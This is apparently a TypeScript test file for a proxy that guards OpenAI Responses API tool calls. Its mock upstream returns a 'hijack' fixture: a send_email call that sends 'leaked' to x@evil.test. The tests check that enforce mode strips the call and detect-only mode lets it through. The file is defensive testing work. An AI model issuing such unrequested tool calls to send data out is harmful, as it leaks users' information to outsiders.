import http from 'node:http';
import OpenAI from 'openai';
import { afterEach, describe, expect, it } from 'vitest';
import { responsesToSse } from './openaiResponsesWire';
import { listenWarrantProxy } from './proxyServer';

const hijackResponse = {
  id: 'resp_mock',
  object: 'response',
  created_at: 0,
  status: 'completed',
  model: 'mock',
  output: [
    {
      type: 'function_call',
      id: 'fc_1',
      call_id: 'call_send',
      name: 'send_email',
      arguments: '{"to":"x@evil.test","body":"leaked"}',
      status: 'completed',
    },
  ],
  usage: { input_tokens: 1, output_tokens: 1, total_tokens: 2 },
};

const tools: OpenAI.Responses.Tool[] = [
  {
    type: 'function',
    name: 'send_email',
    description: 'Send an email to a recipient',
    parameters: {
      type: 'object',
      properties: { to: { type: 'string' }, body: { type: 'string' } },
      required: ['to', 'body'],
      additionalProperties: false,
    },
    strict: true,
  },
];

const input: OpenAI.Responses.ResponseInput = [
  { role: 'user', content: 'Summarize the quarterly report.' },
  { type: 'function_call', call_id: 'call_read', name: 'send_email', arguments: '{}' },
  { type: 'function_call_output', call_id: 'call_read', output: 'Report text.' },
];

describe('responses API through the proxy', () => {
  const servers: http.Server[] = [];

  afterEach(async () => {
    await Promise.all(
      servers.map(
        (server) => new Promise<void>((resolve) => server.close(() => resolve())),
      ),
    );
    servers.length = 0;
  });

  async function startProxy(
    mode: 'ENFORCE' | 'DETECT_ONLY',
    streamUpstream: boolean,
  ): Promise<{ readonly client: OpenAI; readonly paths: string[] }> {
    const paths: string[] = [];
    const upstream = http.createServer((req, res) => {
      paths.push(req.url ?? '');
      req.resume();
      req.on('end', () => {
        if (streamUpstream) {
          res.writeHead(200, { 'content-type': 'text/event-stream' });
          res.end(responsesToSse(hijackResponse));
          return;
        }
        res.writeHead(200, { 'content-type': 'application/json' });
        res.end(JSON.stringify(hijackResponse));
      });
    });
    servers.push(upstream);
    await new Promise<void>((resolve) =>
      upstream.listen(0, '127.0.0.1', () => resolve()),
    );
    const port = (upstream.address() as { port: number }).port;

    const { server, url } = await listenWarrantProxy({
      mode,
      upstreamBaseUrl: `http://127.0.0.1:${port}/v1`,
      upstreamHeaders: { authorization: 'Bearer test-key' },
    });
    servers.push(server);
    return { client: new OpenAI({ apiKey: 'test-key', baseURL: url }), paths };
  }

  it('strips an unwarranted function_call in ENFORCE', async () => {
    const { client, paths } = await startProxy('ENFORCE', false);
    const result = await client.responses.create({ model: 'mock', input, tools });

    expect(paths).toEqual(['/v1/responses']);
    expect(result.output.some((item) => item.type === 'function_call')).toBe(false);
    expect(result.output_text).not.toBe('');
  });

  it('passes the call through in DETECT_ONLY', async () => {
    const { client } = await startProxy('DETECT_ONLY', false);
    const result = await client.responses.create({ model: 'mock', input, tools });
    expect(result.output.some((item) => item.type === 'function_call')).toBe(true);
  });

  it('guards a streamed response and re-emits events the SDK can read', async () => {
    const { client } = await startProxy('ENFORCE', true);
    const stream = await client.responses.create({
      model: 'mock',
      input,
      tools,
      stream: true,
    });

    const types: string[] = [];
    let completed: OpenAI.Responses.Response | undefined;
    for await (const event of stream) {
      types.push(event.type);
      if (event.type === 'response.completed') {
        completed = event.response;
      }
    }

    expect(types[0]).toBe('response.created');
    expect(types).not.toContain('response.function_call_arguments.delta');
    expect(completed?.output.some((item) => item.type === 'function_call')).toBe(false);
  });
});
